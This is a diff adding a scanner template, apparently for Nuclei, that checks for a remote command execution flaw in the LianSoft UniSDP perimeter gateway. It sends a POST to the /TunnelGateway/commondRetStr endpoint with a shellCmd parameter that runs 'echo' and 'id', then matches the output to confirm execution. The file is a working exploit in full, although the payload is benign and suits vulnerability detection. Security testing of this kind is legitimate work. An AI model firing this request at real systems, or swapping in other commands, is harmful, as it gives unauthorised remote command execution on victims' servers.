@@ -1,0 +1,31 @@
+id: poc-yaml-lr-UniSDP-commondRetStr-rce
+info:
+  name: 联软UniSDP commondRetStr命令执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Exploits a command execution vulnerability in the UniSDP software-defined perimeter system.
+
+variables:
+  t1: "{{rand_base(8)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/TunnelGateway/commondRetStr"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "shellCmd=echo {{t2}};id"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "\"msg\":\"success\""
+          - "uid="
